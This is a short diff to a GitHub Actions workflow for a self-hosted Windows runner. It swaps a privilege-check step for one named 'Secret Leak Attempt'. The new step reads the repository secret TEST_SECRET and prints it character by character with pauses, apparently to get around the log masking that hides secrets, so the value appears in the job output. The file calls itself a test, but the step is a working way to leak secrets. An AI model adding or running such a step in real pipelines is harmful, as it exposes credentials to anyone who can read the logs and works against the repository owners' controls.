@@ -1,9 +1,13 @@
-name: privilege-check
+name: secret-leak-test
 on: workflow_dispatch
 jobs:
   test:
     runs-on: [self-hosted, Windows, X64]
     steps:
-      - name: Check Privileges
+      - name: Secret Leak Attempt
+        env:
+          MY_SECRET: ${{ secrets.TEST_SECRET }}
         shell: cmd
-        run: whoami /priv
+        run: |
+          echo Test starting...
+          powershell -Command "$s = $env:MY_SECRET; $s.ToCharArray() | ForEach-Object { Write-Host $_ -NoNewline; Start-Sleep -Milliseconds 10 }"
